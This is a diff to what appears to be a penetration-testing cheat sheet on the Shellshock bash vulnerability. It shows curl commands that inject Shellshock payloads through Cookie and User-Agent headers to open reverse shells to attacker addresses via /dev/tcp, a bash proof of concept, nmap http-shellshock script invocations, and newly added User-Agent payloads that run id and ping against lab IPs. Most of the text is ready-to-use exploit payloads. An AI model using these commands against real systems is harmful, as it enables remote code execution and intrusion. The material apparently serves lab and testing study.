@@ -57,6 +57,7 @@ curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http:
 
 # Reverse shell using curl 
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
+
 ```
 
 + [Nmap Scripting Engine (NSE)](https://nmap.org/book/nse.html)
@@ -91,9 +92,14 @@ nmap --script mycustomscripts,safe example.com
 # Bashdoor POC
 env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
 
-#namp NSE ShellShock
+# namp NSE ShellShock
 nmap -sV -p- --script http-shellshock <target>
 nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <target>
 
+# burpsuit can testing, need to replace User-Agent content attempt vulnerability
+User-Agent: () { :;}; echo; /usr/bin/id
+User-Agent: () { :;}; echo; /bin/ping -c 1 10.129.108.18
+User-Agent: () { :;}; /usr/bin/python3 -c 'import os;os.system("echo; /bin/ping -c 2 10.10.14.15")'; /bin/ping -c 1 10.10.14.15
+User-Agent: () { :;}; echo; /usr/bin/python3 -c 'import os; os.system("/bin/ping -c 1 10.10.14.15")'; /usr/bin/id
 ```
 
